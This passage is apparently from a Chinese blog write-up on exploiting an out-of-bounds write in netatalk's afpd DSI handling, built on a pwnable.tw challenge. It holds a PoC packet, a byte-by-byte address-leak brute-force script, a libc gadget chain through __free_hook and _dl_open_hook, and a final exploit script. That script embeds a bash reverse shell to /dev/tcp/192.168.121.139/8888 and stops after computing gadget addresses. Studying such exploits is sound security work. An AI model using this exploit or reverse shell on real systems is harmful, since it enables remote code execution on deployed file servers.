      <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>

  <span class="token function">memcpy</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>dsi<span class="token operator">-></span>header<span class="token punctuation">.</span>dsi_requestID<span class="token punctuation">,</span> block <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>dsi<span class="token operator">-></span>header<span class="token punctuation">.</span>dsi_requestID<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">memcpy</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>dsi<span class="token operator">-></span>header<span class="token punctuation">.</span>dsi_data<span class="token punctuation">.</span>dsi_doff<span class="token punctuation">,</span> block <span class="token operator">+</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>dsi<span class="token operator">-></span>header<span class="token punctuation">.</span>dsi_data<span class="token punctuation">.</span>dsi_doff<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  dsi<span class="token operator">-></span>header<span class="token punctuation">.</span>dsi_data<span class="token punctuation">.</span>dsi_doff <span class="token operator">=</span> <span class="token function">htonl</span><span class="token punctuation">(</span>dsi<span class="token operator">-></span>header<span class="token punctuation">.</span>dsi_data<span class="token punctuation">.</span>dsi_doff<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">memcpy</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>dsi<span class="token operator">-></span>header<span class="token punctuation">.</span>dsi_len<span class="token punctuation">,</span> block <span class="token operator">+</span> <span class="token number">8</span><span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>dsi<span class="token operator">-></span>header<span class="token punctuation">.</span>dsi_len<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

  <span class="token function">memcpy</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>dsi<span class="token operator">-></span>header<span class="token punctuation">.</span>dsi_reserved<span class="token punctuation">,</span> block <span class="token operator">+</span> <span class="token number">12</span><span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>dsi<span class="token operator">-></span>header<span class="token punctuation">.</span>dsi_reserved<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  dsi<span class="token operator">-></span>clientID <span class="token operator">=</span> <span class="token function">ntohs</span><span class="token punctuation">(</span>dsi<span class="token operator">-></span>header<span class="token punctuation">.</span>dsi_requestID<span class="token punctuation">)</span><span class="token punctuation">;</span>
  
  <span class="token comment">/* make sure we don't over-write our buffers. */</span>
    <span class="token comment">//dsi->cmdlen</span>
  dsi<span class="token operator">-></span>cmdlen <span class="token operator">=</span> <span class="token function">MIN</span><span class="token punctuation">(</span><span class="token function">ntohl</span><span class="token punctuation">(</span>dsi<span class="token operator">-></span>header<span class="token punctuation">.</span>dsi_len<span class="token punctuation">)</span><span class="token punctuation">,</span> dsi<span class="token operator">-></span>server_quantum<span class="token punctuation">)</span><span class="token punctuation">;</span>

  <span class="token comment">/* Receiving DSIWrite data is done in AFP function, not here */</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span>dsi<span class="token operator">-></span>header<span class="token punctuation">.</span>dsi_data<span class="token punctuation">.</span>dsi_doff<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
      <span class="token function">LOG</span><span class="token punctuation">(</span>log_maxdebug<span class="token punctuation">,</span> logtype_dsi<span class="token punctuation">,</span> <span class="token string">"dsi_stream_receive: write request"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      dsi<span class="token operator">-></span>cmdlen <span class="token operator">=</span> dsi<span class="token operator">-></span>header<span class="token punctuation">.</span>dsi_data<span class="token punctuation">.</span>dsi_doff<span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>
	<span class="token comment">//读取DSI command到dsi->commands指向的buf中，长度：dsi->cmdline</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">dsi_stream_read</span><span class="token punctuation">(</span>dsi<span class="token punctuation">,</span> dsi<span class="token operator">-></span>commands<span class="token punctuation">,</span> dsi<span class="token operator">-></span>cmdlen<span class="token punctuation">)</span> <span class="token operator">!=</span> dsi<span class="token operator">-></span>cmdlen<span class="token punctuation">)</span>
    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>

  <span class="token function">LOG</span><span class="token punctuation">(</span>log_debug<span class="token punctuation">,</span> logtype_dsi<span class="token punctuation">,</span> <span class="token string">"dsi_stream_receive: DSI cmdlen: %zd"</span><span class="token punctuation">,</span> dsi<span class="token operator">-></span>cmdlen<span class="token punctuation">)</span><span class="token punctuation">;</span>

  <span class="token keyword">return</span> block<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span></code></pre>

<p>可以看到在最后进行了读取DSI command到dsi-&gt;commands的操作，将造成任意地址写，也就是：</p>
<pre class="language-c" data-language="c"><code class="language-c"><span class="token function">dsi_stream_read</span><span class="token punctuation">(</span>dsi<span class="token punctuation">,</span> dsi<span class="token operator">-></span>commands<span class="token punctuation">,</span> dsi<span class="token operator">-></span>cmdlen<span class="token punctuation">)</span></code></pre>



<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>由于pwnable.tw有编译好的环境那就直接使用了</p>
<pre class="language-none"><code class="language-none">https:&#x2F;&#x2F;pwnable.tw&#x2F;challenge&#x2F;#39</code></pre>

<p>将netatalk下载完后，解压netatalk，查看：</p>
<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/202308012358623.png" alt="image-20230628163955167"></p>
<p>afpd就是目标程序了，afp.conf是配置文件，查看下：</p>
<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/202308012358624.png"></p>
<p>程序将会监听5566端口；使用以下命令运行：</p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">env</span> <span class="token assign-left variable">LD_PRELOAD</span><span class="token operator">=</span>./libatalk.so.18 <span class="token assign-left variable">LD_LIBRARY_PATH</span><span class="token operator">=</span>./ ./afpd <span class="token parameter variable">-d</span> <span class="token parameter variable">-F</span> ./afp.conf</code></pre>

<p>可以使用netstat -tnlp确定是否开启了5566端口：</p>
<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/202308012358625.png"></p>
<p>而为了能发送合法的数据包，还得先看一下数据包的格式</p>
<pre class="language-none"><code class="language-none">https:&#x2F;&#x2F;en.wikipedia.org&#x2F;wiki&#x2F;Data_Stream_Interface#cite_note-2</code></pre>

<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/202308012358626.png" alt="image-20230703161028010"></p>
<p>在dsi.h中也有注释说明：</p>
<pre class="language-c" data-language="c"><code class="language-c"><span class="token comment">/* What a DSI packet looks like:
   0                               32
   |-------------------------------|
   |flags  |command| requestID     |
   |-------------------------------|
   |error code/enclosed data offset|
   |-------------------------------|
   |total data length              |
   |-------------------------------|
   |reserved field                 |
   |-------------------------------|

   CONVENTION: anything with a dsi_ prefix is kept in network byte order.
*/</span></code></pre>



<p>要进入目标函数，还需要满足一些条件：</p>
<p>1、</p>
<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/202309132247631.png" alt="image-20230913224732575"></p>
<pre class="language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">DSIFUNC_OPEN</span>    <span class="token expression"><span class="token number">4</span>       </span><span class="token comment">/* DSIOpenSession */</span></span></code></pre>

<p>2、</p>
<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/202309132312801.png" alt="image-20230913231214775"></p>
<pre class="language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">DSIOPT_ATTNQUANT</span> <span class="token expression"><span class="token number">0x01</span>   </span><span class="token comment">/* attention quantum */</span></span></code></pre>

<p>构造一个不合法的DSI Open Session请求：</p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token comment"># -*- coding:utf-8 -*-</span>

<span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token keyword">import</span> struct

context<span class="token punctuation">(</span>log_level<span class="token operator">=</span><span class="token string">"debug"</span><span class="token punctuation">)</span>

IP <span class="token operator">=</span> <span class="token string">"127.0.0.1"</span>
port <span class="token operator">=</span> <span class="token number">5566</span>

sock <span class="token operator">=</span> remote<span class="token punctuation">(</span>IP <span class="token punctuation">,</span> port<span class="token punctuation">)</span>

<span class="token comment"># dsi_opensession = b"\x01"</span>
<span class="token comment"># dsi_opensession += b"\x80"  #length</span>
<span class="token comment"># dsi_opensession += b"a"*0x80 #client quantum</span>
dsi_opensession <span class="token operator">=</span> <span class="token string">b"\x01"</span>
dsi_opensession <span class="token operator">+=</span> p8<span class="token punctuation">(</span><span class="token number">0xc</span><span class="token punctuation">)</span>
dsi_opensession <span class="token operator">+=</span> <span class="token string">b"a"</span> <span class="token operator">*</span> <span class="token number">0x8</span> <span class="token operator">+</span> <span class="token string">b"clre"</span>

dsi_header <span class="token operator">=</span> <span class="token string">b"\x00"</span> <span class="token comment">#flag</span>
dsi_header <span class="token operator">+=</span> <span class="token string">b"\x04"</span> <span class="token comment">#command DSIFUNC_OPEN</span>
dsi_header <span class="token operator">+=</span> <span class="token string">b"\x00\x01"</span>  <span class="token comment">#requestID</span>
dsi_header <span class="token operator">+=</span> <span class="token string">b"\x00\x00\x00\x00"</span>  <span class="token comment">#data offset</span>
dsi_header <span class="token operator">+=</span> struct<span class="token punctuation">.</span>pack<span class="token punctuation">(</span><span class="token string">b">I"</span><span class="token punctuation">,</span><span class="token builtin">len</span><span class="token punctuation">(</span>dsi_opensession<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment">#data length</span>
dsi_header <span class="token operator">+=</span> <span class="token string">b"\x00\x00\x00\x00"</span>  <span class="token comment">#reserved 保留字段</span>
dsi_header <span class="token operator">+=</span> dsi_opensession

sock<span class="token punctuation">.</span>send<span class="token punctuation">(</span>dsi_header<span class="token punctuation">)</span>

sock<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token comment">#pause()</span>
sock<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>

<p>关闭ASLR（方便调试）</p>
<pre class="language-c" data-language="c"><code class="language-c">echo <span class="token number">0</span> <span class="token operator">></span> <span class="token operator">/</span>proc<span class="token operator">/</span>sys<span class="token operator">/</span>kernel<span class="token operator">/</span>randomize_va_space</code></pre>

<p>启动调试：</p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> gdb <span class="token parameter variable">--pid</span> <span class="token punctuation">[</span>pid<span class="token punctuation">]</span> <span class="token parameter variable">-q</span>
<span class="token builtin class-name">set</span> follow-fork-mode child  <span class="token comment">#追踪子进程</span>
c
<span class="token comment">#运行poc.py</span></code></pre>

<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/202309181401929.png" alt="image-20230918140131787"></p>
<p>进程停止，原因是对地址非法解引用了&#x3D;&#x3D;》记录此处地址，将poc改成刚刚好覆盖掉attn_quantum, datasize, server_quantum;</p>
<p>&#x3D;&#x3D;》再次运行poc：</p>
<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/202309181444963.png" alt="image-20230918143350730"></p>
<p>此时它正好返回我们覆盖“clre”的server_quantum，通过search可以匹配到&#x3D;&#x3D;》所以紧随其后的0x00007f3ea690b010就是*commands了；</p>
<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/202309181445886.png" alt="image-20230918144113365"></p>
<p>通过vmmap查看内存布局，找到*commands所在地址范围，此处我原本使用的环境是ubuntu20.04，但是发现内存布局不是很符合预期，就换成了ubuntu18.04：</p>
<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/202309190012266.png"></p>
<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/202309190012885.png" alt="image-20230919001247799"></p>
<p>可以看出*commands就位于ld.so后面，且大小较大，为此，还得看一下这个内存块是怎么来的；大致判断下创建该空间应该是在fork子进程后实现，所以会在dsi_tcp.c中，也就是上文中的dsi_tcp_open函数中；大致判断一下可以看出是dsi_init_buffer(dsi);，初始化内存空间；</p>
<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/202309192220891.png" alt="image-20230919222049842"></p>
<p>当然，也是可以直接查看dsi-&gt;command的引用，也是可以看到的：</p>
<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/202309192239808.png" alt="image-20230919223905723"></p>
<p>并且dsi-&gt;server_quantum的初始值为DSI_SERVQUANT_DEF ，0x100000超过了brk()能分配的最大大小，所以dsi-&gt;commands是由mmap分配的；</p>
<pre class="language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">DSI_SERVQUANT_DEF</span>   <span class="token expression"><span class="token number">0x100000L</span>   </span><span class="token comment">/* default server quantum (1 MB) */</span></span></code></pre>



<h3 id="泄露地址"><a href="#泄露地址" class="headerlink" title="泄露地址"></a>泄露地址</h3><p>在上文中可以看到，如果我们发送了一个覆盖掉command为非法地址的数据包，会触发非法地址访问，程序将不会有返回包；反之若为合法地址的话会有一个返回包&#x3D;&#x3D;》</p>
<p>由于每次进行TCP连接都会通过fork一个子进程来处理，而<strong>子进程与父进程的地址空间是相同</strong>的&#x3D;&#x3D;》</p>
<p>我们可以通过单字节修改的方式修改command，当程序不出现crash时就证明它是一个合法的地址，并且程序也会将带有<strong>server_quantum的数据包</strong>返回给我们&#x3D;&#x3D;》</p>
<p>由此，我们将可以获得一个合法的地址，并根据这个地址可以计算获得libc的基地址&#x3D;&#x3D;》</p>
<p>在上文中可以看到command所在的内存地址位于高地址，所以可以选择从高地址往低地址方向爆破（255-&gt;0）&#x3D;&#x3D;》</p>
<p>就像是这样，通过单字节修改command，当不出现crash就是合法地址了：</p>
<pre class="language-python" data-language="python"><code class="language-python">dsi_opensession <span class="token operator">=</span> <span class="token string">b"\x01"</span>
dsi_opensession <span class="token operator">+=</span> p8<span class="token punctuation">(</span><span class="token number">0x11</span><span class="token punctuation">)</span>
dsi_opensession <span class="token operator">+=</span> <span class="token string">b"a"</span> <span class="token operator">*</span> <span class="token number">0x10</span> <span class="token operator">+</span> <span class="token string">b"A"</span></code></pre>

<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/202309241651055.png" alt="image-20230924164609095"></p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token comment"># -*- coding:utf-8 -*-</span>

<span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token keyword">import</span> struct

context<span class="token punctuation">(</span>log_level<span class="token operator">=</span><span class="token string">"debug"</span><span class="token punctuation">)</span>
IP <span class="token operator">=</span> <span class="token string">"192.168.121.141"</span> 
port <span class="token operator">=</span> <span class="token number">5566</span>

<span class="token keyword">def</span> <span class="token function">create_dsi</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">:</span>
    dsi  <span class="token operator">=</span> <span class="token string">b'\x00\x04\x00\x01'</span>
    dsi <span class="token operator">+=</span> p32<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token comment">#data offset</span>
    dsi <span class="token operator">+=</span> p32<span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">,</span>endian<span class="token operator">=</span><span class="token string">'big'</span><span class="token punctuation">)</span> <span class="token comment">#data length</span>
    dsi <span class="token operator">+=</span> p32<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token comment">#保留字段</span>
    dsi <span class="token operator">+=</span> data
    <span class="token keyword">return</span> dsi

<span class="token keyword">def</span> <span class="token function">leak_addr</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    leak <span class="token operator">=</span> <span class="token string">b''</span>
    <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">256</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
            <span class="token keyword">if</span><span class="token punctuation">(</span>j<span class="token operator">></span><span class="token number">1</span> <span class="token keyword">and</span> j<span class="token operator">&lt;</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">:</span> i <span class="token operator">=</span> <span class="token number">255</span> <span class="token operator">-</span> i  <span class="token comment">#从高到低</span>
            io <span class="token operator">=</span> remote<span class="token punctuation">(</span>IP<span class="token punctuation">,</span>port<span class="token punctuation">)</span>
            payload  <span class="token operator">=</span> <span class="token string">b'\x01'</span><span class="token operator">+</span> p8<span class="token punctuation">(</span><span class="token number">0x11</span><span class="token operator">+</span>j<span class="token punctuation">)</span><span class="token operator">+</span> <span class="token string">b'a'</span><span class="token operator">*</span><span class="token number">0x10</span> <span class="token operator">+</span> leak <span class="token operator">+</span> p8<span class="token punctuation">(</span>i<span class="token punctuation">)</span>
            io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>create_dsi<span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment">#触发越界写</span>
            <span class="token keyword">try</span><span class="token punctuation">:</span>
                a <span class="token operator">=</span> io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>
                leak <span class="token operator">+=</span> p8<span class="token punctuation">(</span>i<span class="token punctuation">)</span>
                log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
                io<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>
                <span class="token keyword">break</span>
            <span class="token keyword">except</span><span class="token punctuation">:</span>
                io<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> u64<span class="token punctuation">(</span>leak<span class="token punctuation">)</span>

leak_addr <span class="token operator">=</span> leak_addr<span class="token punctuation">(</span><span class="token punctuation">)</span>
log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span>leak_addr<span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre>

<p>执行结果：</p>
<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/202310071804035.png" alt="image-20231007180407872"></p>
<p>查看一下目标程序的内存地址分布</p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">cat</span> /proc/<span class="token punctuation">[</span>PID<span class="token punctuation">]</span>/maps</code></pre>

<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/202310071808206.png" alt="image-20231007180853165"></p>
<p>可以看到泄露出来的地址正好就在ld.so后面；并且可以根据这个地址拿到上面libc的基地址，我这里距离基地址为0xebb000；</p>
<pre class="language-python" data-language="python"><code class="language-python">leak_addr <span class="token operator">=</span> leak_addr<span class="token punctuation">(</span><span class="token punctuation">)</span>
libc_base <span class="token operator">=</span> leak_addr <span class="token operator">-</span> <span class="token number">0xebb000</span></code></pre>



<h3 id="构造利用链"><a href="#构造利用链" class="headerlink" title="构造利用链"></a>构造利用链</h3><p>获取了基地址后也就可以继续构思如何实现RCE了，一般在PWN中，我们一般都是通过劫持几个特殊的函数指针实现：</p>
<p>例如free_hook，exit_hook这些</p>
<pre class="language-URL" data-language="URL"><code class="language-URL">https:&#x2F;&#x2F;xuanxuanblingbling.github.io&#x2F;ctf&#x2F;pwn&#x2F;2021&#x2F;05&#x2F;31&#x2F;libc&#x2F;</code></pre>

<p>当然，在本程序中肯定是不会缺少free的，所以决定往劫持free_hook的方向走&#x3D;&#x3D;》我们的最终目的是system([cmd])&#x3D;&#x3D;》所以是需要一些gadgets控制一些寄存器实现&#x3D;&#x3D;》在libc2.27中就恰好有一段gadget，就是setcontext+53，他在你控制了rdi寄存器的情况下，几乎可以控制所有寄存器；并且在pwntools中也有方便我们控制这段代码的SigreturnFrame，详情的话可以去看看SROP&#x3D;&#x3D;》</p>
<p>setcontext+53：</p>
<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/202310092153979.png" alt="image-20231009215322887"></p>
<p>为此我们还需要控制rdi，这里参考了一些师傅的文章看到了以下两个gadget：</p>
<p>__libc_dlopen_mode+56：</p>
<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/202310072137678.png" alt="image-20231007213715641"></p>
<p>这段gadget首先将_dl_open_hook<strong>内的值</strong>赋值给rax，再以<strong>rax里面的值为地址</strong>取里面的值，跳转至该值对应的地址上；</p>
<p>并且_dl_open_hook也是比较好劫持的，它就在free_hook下方，可以在覆盖劫持free_hook的时候顺便劫持；<strong>偏移为0x2ca0</strong></p>
<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/202310072246925.png"></p>
<p>fgetpos64+207：</p>
<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/202310072139817.png" alt="image-20231007213906778"></p>
<p>这个gadget可以使用ROPgadget找到，主要目的就是将rax赋值给rdi；</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">ROPgadget <span class="token parameter variable">--binary</span> libc-2.27.so <span class="token parameter variable">--only</span> <span class="token string">"mov|call"</span> <span class="token operator">|</span> <span class="token function">grep</span> <span class="token string">"mov rdi, rax"</span></code></pre>

<p>至此，我们已经可以实现控制执行流和大部分寄存器；</p>
<p><strong>布局：</strong></p>
<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/202310092343298.png" alt="image-20231009225751887"></p>
<p>&#x3D;&#x3D;》payload覆盖了free_hook，使得在执行free时执行libc_dlopen_mode+56，这个gadget会取_dl_open_hook中的值赋值给rax，此时这个值被我们覆盖为了_dl_open_hook+8，赋值给rax，然后就会再取<strong>rax（_dl_open_hook+8）里面的值</strong>进行跳转，也就是第二个gadget：fgetpos64+207&#x3D;&#x3D;》</p>
<p>在这个gadget中将rax的值赋值给了rdi，所以现在rax&#x3D;rd的值为_dl_open_hook+8；</p>
<p>进行call，跳转到rax+0x20，所以后面需要填充一段数据0x18大小，加上0x8大小的_dl_open_hook+8刚好为0x20&#x3D;&#x3D;》</p>
<p>此时来到了rax+0x20 ：setcontext+53，因为rdi被赋值为_dl_open_hook+8，距离后续的sigframe还有0x28字节，所以在后面使用SigreturnFrame布局sigframe时要跳过前0x28字节&#x3D;&#x3D;》</p>
<p>最后就是命令执行了，提前在free_hook+8中写入命令（cmd），调用system进行执行。</p>
<h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><pre class="language-python" data-language="python"><code class="language-python"><span class="token comment"># -*- coding:utf-8 -*-</span>

<span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token keyword">import</span> struct

context<span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token string">"amd64"</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">"debug"</span><span class="token punctuation">)</span>
IP <span class="token operator">=</span> <span class="token string">"192.168.121.141"</span> <span class="token comment">#</span>
port <span class="token operator">=</span> <span class="token number">5566</span>
libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./libc-2.27.so'</span><span class="token punctuation">)</span>

cmd <span class="token operator">=</span> <span class="token string">b'bash -c "bash  -i>&amp; /dev/tcp/192.168.121.139/8888 0&lt;&amp;1"'</span>

<span class="token keyword">def</span> <span class="token function">create_dsi</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">:</span>
    dsi  <span class="token operator">=</span> <span class="token string">b'\x00\x04\x00\x01'</span>
    dsi <span class="token operator">+=</span> p32<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token comment">#data offset</span>
    dsi <span class="token operator">+=</span> p32<span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">,</span>endian<span class="token operator">=</span><span class="token string">'big'</span><span class="token punctuation">)</span> <span class="token comment">#data length</span>
    dsi <span class="token operator">+=</span> p32<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token comment">#保留字段</span>
    dsi <span class="token operator">+=</span> data
    <span class="token keyword">return</span> dsi

<span class="token keyword">def</span> <span class="token function">leak_addr</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    leak <span class="token operator">=</span> <span class="token string">b''</span>
    <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">256</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
            <span class="token keyword">if</span><span class="token punctuation">(</span>j<span class="token operator">></span><span class="token number">1</span> <span class="token keyword">and</span> j<span class="token operator">&lt;</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">:</span> i <span class="token operator">=</span> <span class="token number">255</span> <span class="token operator">-</span> i  <span class="token comment">#从高到低</span>
            io <span class="token operator">=</span> remote<span class="token punctuation">(</span>IP<span class="token punctuation">,</span>port<span class="token punctuation">)</span>
            payload  <span class="token operator">=</span> <span class="token string">b'\x01'</span><span class="token operator">+</span> p8<span class="token punctuation">(</span><span class="token number">0x11</span><span class="token operator">+</span>j<span class="token punctuation">)</span><span class="token operator">+</span> <span class="token string">b'a'</span><span class="token operator">*</span><span class="token number">0x10</span> <span class="token operator">+</span> leak <span class="token operator">+</span> p8<span class="token punctuation">(</span>i<span class="token punctuation">)</span>
            io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>create_dsi<span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment">#触发越界写</span>
            <span class="token keyword">try</span><span class="token punctuation">:</span>
                a <span class="token operator">=</span> io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>
                leak <span class="token operator">+=</span> p8<span class="token punctuation">(</span>i<span class="token punctuation">)</span>
                log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
                io<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>
                <span class="token keyword">break</span>
            <span class="token keyword">except</span><span class="token punctuation">:</span>
                io<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> u64<span class="token punctuation">(</span>leak<span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">command_free</span><span class="token punctuation">(</span>io<span class="token punctuation">,</span>addr<span class="token punctuation">)</span><span class="token punctuation">:</span>
    payload <span class="token operator">=</span> <span class="token string">b'\x01'</span> <span class="token operator">+</span> p8<span class="token punctuation">(</span><span class="token number">0x18</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">b"A"</span><span class="token operator">*</span><span class="token number">0x10</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>addr<span class="token punctuation">)</span>
    dsi_free <span class="token operator">=</span> create_dsi<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
    io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>dsi_free<span class="token punctuation">)</span>
    <span class="token keyword">try</span><span class="token punctuation">:</span>
        reply <span class="token operator">=</span> io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>
        <span class="token keyword">return</span> reply <span class="token comment"># it will retrun "AAAA"</span>
    <span class="token keyword">except</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> <span class="token boolean">None</span>

leak_addr <span class="token operator">=</span> leak_addr<span class="token punctuation">(</span><span class="token punctuation">)</span>
log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span>leak_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>

libc_base <span class="token operator">=</span> leak_addr <span class="token operator">-</span> <span class="token number">0xebb000</span>
<span class="token comment">#libc_base = 0x</span>
log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span>libc_base<span class="token punctuation">)</span><span class="token punctuation">)</span>
free_hook<span class="token operator">=</span>libc_base<span class="token operator">+</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">"__free_hook"</span><span class="token punctuation">]</span>
dl_open_hook<span class="token operator">=</span>libc_base<span class="token operator">+</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">"_dl_open_hook"</span><span class="token punctuation">]</span>
system_addr<span class="token operator">=</span>libc_base<span class="token operator">+</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">"system"</span><span class="token punctuation">]</span>
setcontext_53<span class="token operator">=</span>libc_base<span class="token operator">+</span><span class="token number">0x52085</span>
libc_dlopen_mode_56<span class="token operator">=</span>libc_base<span class="token operator">+</span><span class="token number">0x166318</span>
fgetpos64_207<span class="token operator">=</span>libc_base<span class="token operator">+</span><span class="token number">0x7E9cF</span>

